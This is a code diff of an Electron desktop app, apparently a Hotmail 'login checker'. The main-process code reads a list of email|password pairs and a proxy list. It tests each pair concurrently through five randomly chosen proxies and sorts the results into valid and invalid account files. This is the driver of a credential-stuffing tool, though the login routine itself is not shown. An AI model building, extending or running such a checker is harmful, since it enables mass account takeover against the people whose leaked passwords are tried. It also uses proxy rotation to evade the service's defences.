@@ -1,11 +1,10 @@
 const { app, BrowserWindow } = require('electron');
 const path = require('node:path');
-const readline = require('node:readline');
 const electron = require('electron');
+const LineByLineReader = require('line-by-line');
 const fs = require('fs-extra');
 const { sampleSize } = require('lodash');
 const { checkLoginHotmailWithRetry } = require('./action');
-const { enumerateRemainingLines, runWithConcurrency } = require('./run-concurrency');
 const ipc = electron.ipcMain;
 
 let win;
@@ -14,7 +13,6 @@ let pause = false;
 let currentIndex = 0;
 let startTime = 0;
 let interval;
-let isRunning = false;
 
 function createWindow() {
   // Create the browser window.
@@ -45,61 +43,156 @@ app.on('window-all-closed', () => {
 const run = async function (pathFileMail, pathFileProxy, thread) {
   let incompleteFile1 = isFileExists(pathFileMail);
   let incompleteFile2 = isFileExists(pathFileProxy);
+
   if (incompleteFile1) {
     win.webContents.send('checkfiles', incompleteFile1);
-    return false;
+    return;
   }
+
   if (incompleteFile2) {
     win.webContents.send('checkfiles', incompleteFile2);
-    return false;
+    return;
   }
 
+  win.webContents.send('disable', true);
+
   let listProxy = fs.readFileSync(pathFileProxy, 'utf8');
-  listProxy = listProxy.split(/\r?\n/);
-  let outvalid = `${__dirname}\\..\\extraResources\\CheckLoginHotmail\\valid.txt`;
-  let outinvalid = `${__dirname}\\..\\extraResources\\CheckLoginHotmail\\invalid.txt`;
-  const input = fs.createReadStream(pathFileMail, { encoding: 'utf8' });
-  lr = readline.createInterface({ input, crlfDelay: Infinity });
-  const lines = enumerateRemainingLines(lr, currentIndex);
+  listProxy = listProxy
+    .split(/\r?\n/)
+    .filter(Boolean);
 
-  await runWithConcurrency(lines, async ({ line, lineNumber }) => {
-    currentIndex = lineNumber + 1;
-    win.webContents.send('total', currentIndex);
+  const outvalid =
+    `${__dirname}\\..\\extraResources\\CheckLoginHotmail\\valid.txt`;
 
-    const [mail, pass] = line.split('|');
-    if (!mail || pass === undefined) {
-      win.webContents.send('unchecked', 1, pause);
+  const outinvalid =
+    `${__dirname}\\..\\extraResources\\CheckLoginHotmail\\invalid.txt`;
+
+  let running = 0;
+  let fileEnded = false;
+
+  lr = new LineByLineReader(pathFileMail, {
+    start: currentIndex
+  });
+
+  const checkDone = () => {
+    if (fileEnded && running === 0) {
+      if (interval) {
+        clearInterval(interval);
+      }
+
+      isDone = true;
+      win.webContents.send('disable', false);
+    }
+  };
+
+  const processLine = async (info) => {
+    const [mail, pass] = info.split("|");
+
+    try {
+      const proxiesApple = sampleSize(listProxy, 5);
+
+      const {
+        status,
+        email,
+        password
+      } = await checkLoginHotmailWithRetry(
+        mail,
+        pass,
+        proxiesApple
+      );
+
+      if (status === "valid") {
+        const result =
+          `${email}|${password}|${status}\n`;
+
+        fs.appendFileSync(outvalid, result);
+
+        win.webContents.send(
+          'valid',
+          1,
+          pause
+        );
+      } else if (status === "invalid") {
+        const result =
+          `${email}|${password}|${status}\n`;
+
+        fs.appendFileSync(outinvalid, result);
+
+        win.webContents.send(
+          'invalid',
+          1,
+          pause
+        );
+      } else {
+        win.webContents.send(
+          'unchecked',
+          1,
+          pause
+        );
+      }
+    } catch (error) {
+      console.log(error);
+
+      win.webContents.send(
+        'unchecked',
+        1,
+        pause
+      );
+    } finally {
+      running--;
+
+      if (pause) {
+        isDone = false;
+
+        if (lr) {
+          lr.close();
+        }
+
+        return;
+      }
+
+      if (!fileEnded) {
+        lr.resume();
+      }
+
+      checkDone();
+    }
+  };
+
+  lr.on('error', function (err) {
+    win.webContents.send('loi', err);
+    win.webContents.send('disable', false);
+  });
+
+  lr.on('line', function (info) {
+    if (pause) {
+      isDone = false;
+      lr.close();
       return;
     }
 
-    try {
-      const proxiesHotmail = sampleSize(listProxy, 5);
-      const { status, email, password } = await checkLoginHotmailWithRetry(
-        mail,
-        pass,
-        proxiesHotmail
-      );
+    running++;
 
-      if (status === 'valid') {
-        fs.appendFileSync(outvalid, `${email}|${password}|${status}\n`);
-        win.webContents.send('valid', 1, pause);
-      } else if (status === 'invalid') {
-        fs.appendFileSync(outinvalid, `${email}|${password}|${status}\n`);
-        win.webContents.send('invalid', 1, pause);
-      } else {
-        win.webContents.send('unchecked', 1, pause);
-      }
-    } catch (error) {
-      win.webContents.send('unchecked', 1, pause);
-      console.log(error);
+    currentIndex++;
+
+    win.webContents.send(
+      'total',
+      currentIndex
+    );
+
+    processLine(info);
+
+    if (running >= thread) {
+      lr.pause();
     }
-  }, {
-    concurrency: thread,
-    shouldStop: () => pause
   });
 
-  return true;
-}
+  lr.on('end', function () {
+    fileEnded = true;
+
+    checkDone();
+  });
+};
 
 function isFileExists(pathFile) {
   const check = fs.pathExistsSync(pathFile);
@@ -108,45 +201,17 @@ function isFileExists(pathFile) {
 }
 
 ipc.on('start', async function (event, pathFileMail, pathFileProxy, thread) {
-  if (isRunning) return;
-
-  isRunning = true;
-  pause = false;
-  win.webContents.send('disable', true);
-
-  try {
-    let pathFolder = `${__dirname}\\..\\extraResources\\CheckLoginHotmail`;
-    let incompleteFolder = isFileExists(pathFolder);
-    if (incompleteFolder) {
-      fs.mkdirSync(pathFolder);
-    }
-
-    interval = setInterval(() => {
-      startTime++;
-      win.webContents.send('time', startTime);
-    }, 1000);
-
-    const completed = await run(pathFileMail, pathFileProxy, thread);
-    if (completed && !pause) {
-      win.webContents.send('done', true);
-    }
-  } catch (error) {
-    win.webContents.send('loi', error.message || String(error));
-  } finally {
-    if (lr) {
-      lr.close();
-      if (lr.input && !lr.input.destroyed) {
-        lr.input.destroy();
-      }
-      lr = null;
-    }
-    if (interval) {
-      clearInterval(interval);
-      interval = null;
-    }
-    isRunning = false;
-    win.webContents.send('disable', false);
+  let pathFolder = `${__dirname}\\..\\extraResources\\CheckLoginHotmail`;
+  let incompleteFolder = isFileExists(pathFolder);
+  if (incompleteFolder) {
+    fs.mkdirSync(pathFolder);
   }
+  pause = false;
+  interval = setInterval(() => {
+    startTime++;
+    win.webContents.send('time', startTime);
+  }, 1000);
+  run(pathFileMail, pathFileProxy, thread);
 })
 
 ipc.on('pause', async function (event) {
@@ -154,11 +219,6 @@ ipc.on('pause', async function (event) {
     pause = true;
     if (interval) {
       clearInterval(interval)
-      interval = null;
-    }
-    lr.close();
-    if (lr.input && !lr.input.destroyed) {
-      lr.input.destroy();
     }
     win.webContents.send('info', "Đang tạm dừng...Vui lòng chờ...", true);
   }
